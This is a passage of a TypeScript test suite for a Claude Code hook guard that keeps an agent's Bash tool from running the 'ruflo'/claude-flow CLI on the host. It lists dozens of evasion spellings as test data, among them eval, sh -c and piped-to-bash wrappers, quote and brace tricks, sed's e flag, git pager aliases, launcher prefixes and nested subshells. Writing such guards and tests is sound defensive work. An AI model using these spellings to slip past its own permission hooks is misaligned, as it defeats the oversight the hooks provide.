/**
 * Twin test for `scripts/ruflo-host-guard.mjs` (SMI-6744 Wave 4 / A4.6).
 *
 * Same two-part shape as `env-read-guard.test.ts`: a real-file
 * registration pin plus a table-driven `decide()` case table, per
 * docs/internal/implementation/smi-6744-ruflo-host-guard.md's own
 * "Twin test" section, built from the 62-row adversarial census in
 * docs/internal/uat/smi-6744/a44-structural-design-2026-09-27.md § 5.
 *
 * Every deny row's predicate label was MEASURED against this guard's own
 * decide() (not assumed from the census's "Closed by" column) before being
 * hardcoded here — several rows are closed by a different H-predicate, or
 * an H-predicate at all, than the census's own shorthand once this guard's
 * actual segment-splitting/wrapper-normalization order is run (e.g. C6 and
 * C9 are closed by H1 in this implementation, not the census's cited H3/H7,
 * because H1 is checked first and both paths already contain the
 * `node_modules/ruflo` or `lib/node_modules/ruflo` substring H1 tests for).
 *
 * D9, D10 and E6 are excluded from the census table below, per the plan:
 * D9/D10 (`ln -s …` / `cp …` then invoke the copy) are closed ONLY by
 * host-tree removal (Layer X) — this guard correctly ALLOWS the isolated
 * second step (`node /tmp/x …`), which names nothing ruflo-shaped; E6
 * (`mcp__ruflo__terminal_execute`) is not a Bash spelling at all, closed by
 * an MCP deny this plan does not touch. D11 is tested separately below (H8
 * arms), not via the generic census loop, since its own census "Closed by"
 * text does not literally contain "H" in the source census's original
 * form (H8 was added to close it in this design's own round 1).
 */
import { spawnSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'

import { describe, expect, it } from 'vitest'

import { decide } from '../ruflo-host-guard.mjs'

const SETTINGS_PATH = fileURLToPath(new URL('../../.claude/settings.json', import.meta.url))
const GUARD_SCRIPT_PATH = fileURLToPath(new URL('../ruflo-host-guard.mjs', import.meta.url))

function bashCall(command: string) {
  return { tool_name: 'Bash', tool_input: { command } }
}

function sessionStartCall(toolInput: unknown) {
  return { tool_name: 'mcp__ruflo__hooks_session-start', tool_input: toolInput }
}

function reasonOf(result: ReturnType<typeof decide>): string {
  return result.json?.hookSpecificOutput?.permissionDecisionReason ?? ''
}

// --- Registration pin ---

describe('.claude/settings.json registration (regression pin)', () => {
  it('registers ruflo-host-guard.mjs on the Bash PreToolUse matcher', () => {
    const settings = JSON.parse(readFileSync(SETTINGS_PATH, 'utf8'))
    const preToolUse = settings.hooks?.PreToolUse
    expect(Array.isArray(preToolUse)).toBe(true)

    const bashEntry = preToolUse.find((entry: { matcher?: string }) => entry.matcher === 'Bash')
    expect(bashEntry).toBeDefined()
    const hasGuardHook = (bashEntry.hooks ?? []).some(
      (hook: Record<string, unknown>) =>
        hook.type === 'command' &&
        typeof hook.command === 'string' &&
        hook.command.includes('node') &&
        hook.command.includes('scripts/ruflo-host-guard.mjs')
    )
    expect(hasGuardHook).toBe(true)
  })

  it('registers ruflo-host-guard.mjs on the ^mcp__ruflo__hooks_session-start$ matcher', () => {
    const settings = JSON.parse(readFileSync(SETTINGS_PATH, 'utf8'))
    const preToolUse = settings.hooks?.PreToolUse
    const entry = preToolUse.find(
      (e: { matcher?: string }) => e.matcher === '^mcp__ruflo__hooks_session-start$'
    )
    expect(entry).toBeDefined()
    const hasGuardHook = (entry.hooks ?? []).some(
      (hook: Record<string, unknown>) =>
        hook.type === 'command' &&
        typeof hook.command === 'string' &&
        hook.command.includes('node') &&
        hook.command.includes('scripts/ruflo-host-guard.mjs')
    )
    expect(hasGuardHook).toBe(true)
  })
})

// --- Full census table (58 rows: 57 H-closed deny + E1 sanctioned allow) ---
// [census id, command, expected action, expected predicate substring or null]
const CENSUS_ROWS: Array<[string, string, 'allow' | 'deny', string | null]> = [
  ['A1', 'npx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A2', 'npx -y ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A3', 'npx --yes ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A4', 'npx ruflo@3.14.2 memory store --key k --value v', 'deny', 'H5'],
  ['A5', 'npx -p ruflo ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A6', 'npx --package=ruflo ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A7', 'npm exec ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A8', 'npm exec -- ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A9', 'npm x ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A10', 'pnpm dlx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A11', 'yarn dlx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A12', 'corepack npx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A13', 'bunx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A14', 'deno run -A npm:ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A15', 'npx --cache=/tmp ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A16', 'NPM_CONFIG_CACHE=/tmp npx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['A17', 'npx @claude-flow/cli mcp start', 'deny', 'H5'],
  // A18 is the SAME string as A1, deliberately (SMI-6744 Wave 4 L-9
  // governance finding, not a copy-paste duplicate): the census
  // distinguishes A1/A18 by HOST STATE (an npx local-cache miss vs. hit),
  // which this guard's decide() cannot observe -- it only ever sees the
  // command STRING -- so the two rows are expected to collapse to
  // identical input/output here.
  ['A18', 'npx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['B1', 'node node_modules/ruflo/bin/ruflo.js memory store --key k --value v', 'deny', 'H1'],
  ['B2', 'node ./node_modules/ruflo/bin/ruflo.js memory store --key k --value v', 'deny', 'H1'],
  [
    'B3',
    'node /Users/x/skillsmith/node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  [
    'B4',
    'node "$PWD/node_modules/ruflo/bin/ruflo.js" memory store --key k --value v',
    'deny',
    'H1',
  ],
  ['B5', 'cd node_modules/ruflo && node bin/ruflo.js memory store --key k --value v', 'deny', 'H1'],
  ['B6', 'node node_modules/@claude-flow/cli/bin/cli.js mcp start', 'deny', 'H2'],
  ['B7', 'node node_modules/@claude-flow/cli/bin/mcp-server.js', 'deny', 'H2'],
  ['B8', 'node -e "import(\'./node_modules/ruflo/bin/ruflo.js\')"', 'deny', 'H1'],
  ['B9', "node --import ./node_modules/ruflo/bin/ruflo.js -e ''", 'deny', 'H1'],
  ['B10', 'node node_modules/.bin/ruflo memory store --key k --value v', 'deny', 'H3'],
  ['C1', './node_modules/.bin/ruflo memory store --key k --value v', 'deny', 'H3'],
  ['C2', 'node_modules/.bin/ruflo memory store --key k --value v', 'deny', 'H3'],
  ['C3', 'node_modules/.bin/claude-flow memory store --key k --value v', 'deny', 'H3'],
  ['C4', 'node_modules/.bin/claude-flow-mcp', 'deny', 'H3'],
  ['C5', 'node_modules/.bin/cli memory store --key k --value v', 'deny', 'H3'],
  ['C6', 'node_modules/ruflo/bin/ruflo.js memory store --key k --value v', 'deny', 'H1'],
  ['C7', 'ruflo memory store --key k --value v', 'deny', 'H4'],
  [
    'C8',
    '/Users/x/.nvm/versions/node/v22.22.2/bin/ruflo memory store --key k --value v',
    'deny',
    'H7',
  ],
  [
    'C9',
    'node /Users/x/.nvm/versions/node/v22.22.2/lib/node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  ['C10', 'claude-flow memory store --key k --value v', 'deny', 'H4'],
  [
    'D1',
    'command node node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  [
    'D2',
    'env X=1 node node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  ['D3', 'env RUFLO_DEBUG=1 ruflo memory store --key k --value v', 'deny', 'H4'],
  [
    'D4',
    "sh -c 'node node_modules/ruflo/bin/ruflo.js memory store --key k --value v'",
    'deny',
    'H1',
  ],
  ['D5', "bash -lc 'ruflo memory store --key k --value v'", 'deny', 'H4'],
  [
    'D6',
    'eval "node node_modules/ruflo/bin/ruflo.js memory store --key k --value v"',
    'deny',
    'H1',
  ],
  ['D7', "echo 'memory store --key k' | xargs node node_modules/ruflo/bin/ruflo.js", 'deny', 'H1'],
  [
    'D8',
    "find node_modules/ruflo/bin -name 'ruflo.js' -exec node {} memory store --key k \\;",
    'deny',
    'H1',
  ],
  ['D12', 'noglob npx ruflo memory store --key k --value v', 'deny', 'H5'],
  ['D13', 'NODE_OPTIONS="--require ./node_modules/ruflo/bin/ruflo.js" node -e \'\'', 'deny', 'H1'],
  ['D14', 'sudo node node_modules/ruflo/bin/ruflo.js memory store --key k --value v', 'deny', 'H1'],
  [
    'E1',
    'docker exec skillsmith-ruflo-1 node /opt/ruflo-seed/node_modules/@claude-flow/cli/bin/cli.js mcp start',
    'allow',
    null,
  ],
  [
    'E2',
    'docker exec skillsmith-dev-1 node node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  [
    'E3',
    'docker run --rm -v "$PWD":/app node:22-slim node /app/node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  ['E4', 'docker run --rm node:22-slim npx -y ruflo memory store --key k --value v', 'deny', 'H5'],
  [
    'E5',
    'docker compose --profile dev run --rm dev node node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  [
    'F1',
    'node ~/.npm/_npx/5136ad6db8e498e9/node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
  [
    'F2',
    '~/.npm/_npx/489f51a63dd46519/node_modules/.bin/ruflo memory store --key k --value v',
    'deny',
    'H3',
  ],
  [
    'F3',
    'node ~/.npm/_npx/85fb20e3e7e3a233/node_modules/@claude-flow/cli/bin/cli.js mcp start',
    'deny',
    'H2',
  ],
  [
    'F4',
    'node ~/.npm/_npx/5e4ef4085681fb7a/node_modules/ruflo/bin/ruflo.js memory store --key k --value v',
    'deny',
    'H1',
  ],
]

describe('decide() — full 58-row census table (58 = 62 - D9 - D10 - D11 - E6)', () => {
  it.each(CENSUS_ROWS)('%s -> %s :: %s', (_id, command, expected, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe(expected)
    if (predicate) expect(reasonOf(result)).toContain(predicate)
  })
})

// --- Quote-synthesis inputs ---

describe('decide() — quote-synthesis inputs (round 0)', () => {
  it("npx ru''flo … denies (single-quote synthesis)", () => {
    expect(decide(bashCall("npx ru''flo memory store --key k --value v"), {}).action).toBe('deny')
  })

  it('npx ru\\flo … denies (backslash synthesis)', () => {
    expect(decide(bashCall('npx ru\\flo memory store --key k --value v'), {}).action).toBe('deny')
  })
})

// --- Round 1 inputs and their greens ---

describe('decide() — round 1 inputs (eval, exec, braces)', () => {
  const redArms: Array<[string, string]> = [
    ['X=\'npx ruflo\'; eval "$X"', 'H9'],
    ["eval 'npx ruflo memory store --key k --value v'", 'H5'],
    ['exec ruflo memory store --key k', 'H4'],
    ['exec npx -p ruflo ruflo memory store --key k', 'H5'],
    ['exec env X=1 ruflo memory store --key k', 'H4'],
    ['npx ru{f,}lo memory store --key k', 'brace-syntax'],
    ['npx {ruflo,eslint} memory store --key k', 'brace-syntax'],
    ['env X=1 npx ru{f,}lo memory store --key k', 'brace-syntax'],
  ]

  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })

  const greenArms = ["eval 'printf %s harmless'", 'exec printf harmless', "printf '{harmless}'"]

  it.each(greenArms)('%s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

// --- H8's two arms (D11) ---

describe('decide() — H8 (D11 registry-fetch closure)', () => {
  it('V=ru; npx "${V}flo" … denies via H8(ii) only (not H5)', () => {
    const result = decide(bashCall('V=ru; npx "${V}flo" memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
    expect(reasonOf(result)).not.toContain('H5')
  })

  it('V=ruflo; npx "$V" … denies (H8(i) fires on the bare assignment segment)', () => {
    const result = decide(bashCall('V=ruflo; npx "$V" memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
  })
})

// --- Green arms: Stage 1 rows, own-merit greens, laundering red arms, compound case ---

describe('decide() — Stage 1 sanctioned forms (green)', () => {
  const rows = [
    'docker exec skillsmith-ruflo-1 node /opt/ruflo-seed/node_modules/@claude-flow/cli/bin/cli.js mcp start',
    'npm ls -g ruflo',
    'npm view ruflo',
    'npm uninstall -g ruflo',
  ]
  it.each(rows)('%s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

describe('decide() — own-merit greens (no allowlist involved)', () => {
  const rows = [
    'git log --grep ruflo',
    'grep -rn ruflo scripts/',
    './scripts/ruflo-service-up.sh',
    'docker compose --profile ruflo up -d',
    'ls node_modules | grep ruflo',
  ]
  it.each(rows)('%s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

describe("decide() — laundering inputs (Queen's pre-review corrections item 1)", () => {
  // The removed Stage-1 allowlist rows (find -exec, awk system(), sed e,
  // rg --pre, cat|node, git -c core.pager, git alias, docker compose run)
  // would have exempted these whole segments; with no reader carve-out
  // they must all deny on the element that names the path.
  //
  // RESIDUAL GAP CLOSED (SMI-6744 Wave 4 governance round, post-
  // implementation): the LITERAL plan example
  // `sed 's/^/node node_modules\/ruflo\/bin\/ruflo.js/e'` (escaped `/` as
  // sed's own delimiter -- not shell escaping; the tokenizer correctly
  // preserves the literal backslash characters inside the single-quoted sed
  // script) used to ALLOW, because the backslashes sed's own delimiter-
  // escaping convention requires broke the contiguous `node_modules/ruflo`
  // substring H1/H2/H7 test for. Fixed by testing each scanned element
  // against BOTH its raw form and a backslash-de-escaped view
  // (`deEscape()` in ruflo-host-guard-predicates.mjs) -- watched failing
  // against the pre-fix predicates (see implementation hand-back) before
  // the fix landed. The `#`-delimiter row below is KEPT as its own arm
  // (not redundant with the `/`-delimiter row above it): it is the "needs
  // no escaping at all" spelling of the same "sed with an `e` flag" attack
  // class, so it must keep denying via the plain (non-de-escaped) path
  // regardless of what the de-escape view finds.
  const rows = [
    "find node_modules/ruflo/bin -name 'ruflo.js' -exec node {} memory store --key k \\;",
    'awk \'BEGIN{system("node node_modules/ruflo/bin/ruflo.js memory store")}\'',
    "sed 's/^/node node_modules\\/ruflo\\/bin\\/ruflo.js/e'",
    "sed 's#^#node node_modules/ruflo/bin/ruflo.js#e'",
    "rg --pre 'node node_modules/ruflo/bin/ruflo.js' .",
    'cat node_modules/ruflo/bin/ruflo.js | node',
    "git -c core.pager='node node_modules/ruflo/bin/ruflo.js' log",
    "git config alias.x '!node node_modules/ruflo/bin/ruflo.js memory store' && git x",
    'docker compose --profile dev run --rm dev node node_modules/ruflo/bin/ruflo.js memory store',
  ]
  it.each(rows)('%s -> deny', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })
})

describe('decide() — compound command: a sanctioned segment does not launder an unsanctioned one', () => {
  it('docker exec skillsmith-ruflo-1 … && npx ruflo … -> deny', () => {
    const result = decide(
      bashCall('docker exec skillsmith-ruflo-1 sqlite3 foo.db && npx ruflo memory store --key k'),
      {}
    )
    expect(result.action).toBe('deny')
  })
})

// --- SMI-6744 Wave 4 governance-round fixes (H-A through M-D) ---

describe('decide() — H-A: launcher prefixes defeat H4/H5 (governance round)', () => {
  const redArms: Array<[string, string]> = [
    ['timeout 5 ruflo memory store --key k --value v', 'H4'],
    ['nohup ruflo memory store --key k --value v', 'H4'],
    ['nice -n 10 ruflo memory store --key k --value v', 'H4'],
    ['setsid ruflo memory store --key k --value v', 'H4'],
    ['stdbuf -o0 ruflo memory store --key k --value v', 'H4'],
    ['script -q /dev/null ruflo memory store --key k --value v', 'H4'],
    ['xargs ruflo memory store --key k --value v', 'H4'],
    ['time ruflo memory store --key k --value v', 'H4'],
    ["builtin eval 'npx ruflo memory store --key k --value v'", 'H5'],
  ]
  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })

  it('control: timeout 5 npx ruflo … still denies via H5 (not widened to any position)', () => {
    const result = decide(bashCall('timeout 5 npx ruflo memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5')
  })

  it('control: nohup node node_modules/ruflo/bin/ruflo.js … still denies via H1', () => {
    const result = decide(
      bashCall('nohup node node_modules/ruflo/bin/ruflo.js memory store --key k --value v'),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H1')
  })

  it('control: git log --grep ruflo still allows (launcher table does not over-match)', () => {
    expect(decide(bashCall('git log --grep ruflo'), {}).action).toBe('allow')
  })
})

describe('decide() — H-B: `env -S`/`--split-string` collapses the command (governance round)', () => {
  const redArms = [
    "env -S 'ruflo memory store --key k --value v'",
    "env --split-string='ruflo memory store'",
    "env -S 'npx ruflo memory store'",
  ]
  it.each(redArms)('%s -> deny', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  it("env -S 'printf harmless' -> allow (green control)", () => {
    expect(decide(bashCall("env -S 'printf harmless'"), {}).action).toBe('allow')
  })
})

describe('decide() — H-C: `command eval`/`builtin eval`/`noglob eval` evade H9 (governance round)', () => {
  const redArms = [
    "command eval 'npx ruflo memory store --key k --value v'",
    "builtin eval 'npx ruflo memory store'",
    "noglob eval 'npx ruflo memory store'",
  ]
  it.each(redArms)('%s -> deny (H5, via the recursed literal text)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5')
  })
})

describe('decide() — H-D: no path normalisation lets `//` and `/./` through (governance round)', () => {
  const redArms: Array<[string, string]> = [
    ['node node_modules/@claude-flow/cli//bin/cli.js mcp start', 'H2'],
    ['node node_modules/@claude-flow/cli/./bin/cli.js mcp start', 'H2'],
    ['node node_modules/@claude-flow//cli/bin/cli.js mcp start', 'H2'],
    ['./node_modules//.bin/ruflo memory store', 'H3'],
    ['node_modules/./.bin/ruflo memory store', 'H3'],
  ]
  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })

  it('existing negative controls stay green: git log --grep ruflo', () => {
    expect(decide(bashCall('git log --grep ruflo'), {}).action).toBe('allow')
  })

  it('existing negative controls stay green: ls node_modules | grep ruflo', () => {
    expect(decide(bashCall('ls node_modules | grep ruflo'), {}).action).toBe('allow')
  })
})

describe('decide() — H-E: `varlock run <payload> -- x` drops the command (governance round)', () => {
  it('varlock run npx ruflo memory store --key k -- x -> deny', () => {
    expect(decide(bashCall('varlock run npx ruflo memory store --key k -- x'), {}).action).toBe(
      'deny'
    )
  })

  it('varlock run ruflo memory store --key k -- x -> deny', () => {
    expect(decide(bashCall('varlock run ruflo memory store --key k -- x'), {}).action).toBe('deny')
  })

  it('control: varlock run -- npx ruflo … still denies via H5', () => {
    const result = decide(bashCall('varlock run -- npx ruflo memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H5')
  })

  it('control: varlock run ruflo … (no trailing --) still denies via H4', () => {
    const result = decide(bashCall('varlock run ruflo memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — H-F: literal text piped/fed into a shell (governance round)', () => {
  const redArms = [
    "echo 'npx ruflo memory store --key k --value v' | bash",
    "printf 'npx ruflo memory store' | sh",
    "bash <<< 'npx ruflo memory store'",
    "bash <(echo 'npx ruflo memory store')",
  ]
  it.each(redArms)('%s -> deny', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  it("echo 'hello' | bash -> allow (green control)", () => {
    expect(decide(bashCall("echo 'hello' | bash"), {}).action).toBe('allow')
  })

  it("bash <<< 'printf harmless' -> allow (green control)", () => {
    expect(decide(bashCall("bash <<< 'printf harmless'"), {}).action).toBe('allow')
  })
})

describe('decide() — M-A: narrowed H8(ii) stops denying ordinary repo commands (governance round)', () => {
  const greenArms = [
    'npx vitest run "$F"',
    'docker exec skillsmith-dev-1 npx vitest run "$F"',
    'npx prettier --write "$f"',
    'npx eslint $(git diff --name-only)',
    'npm run lint -- $ARGS',
    'npx tsx scripts/x.ts "$ARG"',
    'npm ci --prefix "$(pwd)"',
    'bash -c \'npx vitest run "$F"\'',
    'npm run build --workspace=$W',
  ]
  it.each(greenArms)('%s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  it('control: V=ru; npx "${V}flo" … still denies via H8 (slot 1), not H5', () => {
    const result = decide(bashCall('V=ru; npx "${V}flo" memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
    expect(reasonOf(result)).not.toContain('H5')
  })

  it('control: npx `echo ruflo` memory store … still denies via H8 (slot 1, .subs)', () => {
    const result = decide(bashCall('npx `echo ruflo` memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
  })
})

describe('decide() — M-B: brace check fires before the runner (governance round)', () => {
  it('{ npm run lint; } -> allow (shell grouping syntax, not a brace expansion)', () => {
    expect(decide(bashCall('{ npm run lint; }'), {}).action).toBe('allow')
  })

  it("npx prettier --write scripts/{a,b}.ts -> deny (brace AFTER the runner, design's chosen posture)", () => {
    const result = decide(bashCall('npx prettier --write scripts/{a,b}.ts'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('brace-syntax')
  })

  it('control: npx ru{f,}lo memory store --key k still denies (brace-syntax)', () => {
    const result = decide(bashCall('npx ru{f,}lo memory store --key k'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('brace-syntax')
  })

  it('control: npx {ruflo,eslint} memory store --key k still denies (brace-syntax)', () => {
    const result = decide(bashCall('npx {ruflo,eslint} memory store --key k'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('brace-syntax')
  })

  it('control: env X=1 npx ru{f,}lo memory store --key k still denies (brace-syntax)', () => {
    const result = decide(bashCall('env X=1 npx ru{f,}lo memory store --key k'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('brace-syntax')
  })
})

describe('decide() — M-C: Stage-1 sanctioned docker exec checked before H8(i) (governance round)', () => {
  it('docker exec skillsmith-ruflo-1 env V=ruflo node … -> allow', () => {
    const result = decide(
      bashCall(
        'docker exec skillsmith-ruflo-1 env V=ruflo node /opt/ruflo-seed/node_modules/@claude-flow/cli/bin/cli.js x'
      ),
      {}
    )
    expect(result.action).toBe('allow')
  })
})

describe('decide() — L-A: `docker container exec` long-form alias (governance round)', () => {
  it('docker container exec skillsmith-ruflo-1 … -> allow', () => {
    const result = decide(
      bashCall(
        'docker container exec skillsmith-ruflo-1 node /opt/ruflo-seed/node_modules/@claude-flow/cli/bin/cli.js mcp start'
      ),
      {}
    )
    expect(result.action).toBe('allow')
  })

  it('docker container exec skillsmith-dev-1 node node_modules/ruflo/bin/ruflo.js … -> deny (H1)', () => {
    const result = decide(
      bashCall(
        'docker container exec skillsmith-dev-1 node node_modules/ruflo/bin/ruflo.js memory store --key k --value v'
      ),
      {}
    )
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H1')
  })
})

describe('decide() — L-B: `npm uninstall -g ruflo --dry-run` (governance round)', () => {
  it('allows the dry-run form (strictly safer than the already-sanctioned bare uninstall)', () => {
    expect(decide(bashCall('npm uninstall -g ruflo --dry-run'), {}).action).toBe('allow')
  })
})

describe('decide() — L-D: H1_RE2/H2 trailing boundary + bare --require specifier (governance round)', () => {
  const redArms: Array<[string, string]> = [
    ['node -e \'import("ruflo/bin/ruflo.js")\'', 'H1'],
    ["node --require ruflo -e ''", 'H1'],
    ['node -e \'import("@claude-flow/cli/bin/cli.js")\'', 'H2'],
  ]
  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })
})

describe('decide() — M-D: standing arm for the fail-closed depth-cap boundary (governance round)', () => {
  function nestedSubshells(n: number, inner: string): string {
    let cmd = inner
    for (let i = 0; i < n; i++) cmd = `echo $(${cmd})`
    return cmd
  }

  it('eight nested $(...) denies with reason containing "internal error", not the fail-open the cap prevents', () => {
    const result = decide(bashCall(nestedSubshells(8, 'npx ruflo memory store')), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('internal error')
  })
})

// SMI-6869 governance round 15 C3 (control, not a fix for THIS file): the
// sibling env-read-guard.mjs's own depth cap failed OPEN at its shared
// MAX_DEPTH -- this guard's own `evaluateGuardCommand` already failed
// CLOSED at the same cap before that fix, and this file was not touched by
// it. A 7-level `bash -c` chain (the same construction env-read-guard's own
// round-15 C3 test uses, not this file's usual `echo $(...)` nesting) must
// still deny exactly as it did before.
describe("decide() — SMI-6869 governance round 15 C3 control: this guard's own depth cap is unaffected by the sibling env-read-guard.mjs fix", () => {
  function nestBashC(n: number, inner: string): string {
    let s = inner
    for (let k = 0; k < n; k++) {
      s = 'bash -c "' + s.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"'
    }
    return s
  }

  it('a 7-level bash -c chain around npx ruflo memory store still denies with "internal error", unchanged', () => {
    const result = decide(bashCall(nestBashC(7, 'npx ruflo memory store')), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('internal error')
  })
})

// --- SMI-6744 Wave 4 DELTA governance round: H-1 through M-6, L-1 through L-4 ---
// Every red arm below was watched failing (allowing, or denying via the
// wrong predicate) against the unfixed code before its fix landed — see
// the hand-back report for the exact revert/run/restore trail per fix
// area (some fixes span multiple files, so a per-file git revert was used
// rather than reverting this whole file's own test additions).

describe('decide() — H-1: launcher-table arity fixes (timeout -k/-s, chrt positional, script -c, xargs -I{}) (delta round)', () => {
  const redArms: Array<[string, string]> = [
    ['timeout -k 2 5 ruflo memory store --key k --value v', 'H4'],
    ['timeout -s KILL 5 ruflo memory store --key k --value v', 'H4'],
    ['chrt -f 1 ruflo memory store --key k --value v', 'H4'],
    ["script -q -c 'ruflo memory store --key k --value v' /dev/null", 'H4'],
    ["script /dev/null -c 'ruflo memory store --key k --value v'", 'H4'],
    ['xargs -I{} ruflo {}', 'H4'],
    ['xargs -I {} ruflo {}', 'H4'],
  ]
  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })

  it('control: xargs ruflo memory store (no -I at all) still denies via H4', () => {
    const result = decide(bashCall('xargs ruflo memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  it('control: find . -print0 | xargs -0 rm (a real, harmless xargs use) still allows', () => {
    expect(decide(bashCall('find . -print0 | xargs -0 rm'), {}).action).toBe('allow')
  })
})

describe('decide() — H-2: exec/command/noglob/builtin get their OWN value-flags, not the shared set (delta round)', () => {
  const redArms: Array<[string, string]> = [
    ['exec -a x ruflo memory store --key k --value v', 'H4'],
    ['command -p ruflo memory store --key k --value v', 'H4'],
  ]
  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })
})

describe('decide() — H-3: env -S skips past its own flags/assignments, handles the glued form (delta round)', () => {
  const redArms = [
    "env -S'ruflo memory store --key k --value v'",
    "env -uX -S 'ruflo memory store --key k --value v'",
    "env X=1 -S 'ruflo memory store --key k --value v'",
  ]
  it.each(redArms)('%s -> deny', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })
})

describe('decide() — H-4: a glued here-string (bash <<<"text") is detected (delta round)', () => {
  const redArms = [
    'bash <<<"npx ruflo memory store --key k --value v"',
    "bash <<<'npx ruflo memory store --key k --value v'",
    'sh <<<"ruflo memory store --key k --value v"',
  ]
  it.each(redArms)('%s -> deny', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })
})

describe('decide() — H-5: runner value-flags, subcommand table, -p= (delta round)', () => {
  const redArms = [
    'npx --cache /tmp "$V"',
    'npm exec --prefix /tmp "$V"',
    'pnpm dlx --silent "$V"',
    'yarn dlx "$V"',
    'bun x "$V"',
    'corepack npx "$V"',
    'deno run -A "npm:$V"',
    'npx -p="$V" x',
  ]
  it.each(redArms)('%s -> deny (H8)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
  })

  const greenArms = [
    'npx vitest run "$F"',
    'docker exec skillsmith-dev-1 npx vitest run "$F"',
    'npx prettier --write "$f"',
    'npx eslint $(git diff --name-only)',
    'npm run lint -- $ARGS',
    'npx tsx scripts/x.ts "$ARG"',
    'npm ci --prefix "$(pwd)"',
    'bash -c \'npx vitest run "$F"\'',
    'npm run build --workspace=$W',
  ]
  it.each(greenArms)('still allows: %s (M-A greens unaffected)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

describe("decide() — H-6: $'...' ANSI-C quoting collapses the command (delta round)", () => {
  it("bash -c $'npx ruflo memory store --key k --value v' -> deny", () => {
    const result = decide(bashCall("bash -c $'npx ruflo memory store --key k --value v'"), {})
    expect(result.action).toBe('deny')
  })
})

describe('decide() — H-8: bare ruflo/claude-flow reference inside inline interpreter script text (delta round)', () => {
  const redArms = [
    'node -e \'require("child_process").execSync("ruflo")\'',
